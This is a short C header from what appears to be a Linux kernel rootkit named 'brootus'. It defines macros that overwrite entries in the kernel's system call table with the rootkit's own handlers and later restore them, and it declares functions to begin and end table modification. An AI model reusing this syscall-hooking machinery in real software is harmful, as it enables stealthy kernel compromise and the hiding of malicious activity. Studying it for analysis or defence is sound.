#ifndef SYSCALL_H
#define SYSCALL_H

#include "sysmap.h"
#include "kernel_variables.h"

#define HOOK_SYSCALL(NAME) original_##NAME = sys_call_table[__NR_##NAME]; \
													 sys_call_table[__NR_##NAME] = brootus_##NAME

#define RESTORE_SYSCALL(NAME) sys_call_table[__NR_##NAME] = original_##NAME

/*
 * Functions
 */

extern void syscall_table_modify_begin(void);
extern void syscall_table_modify_end(void);

#endif
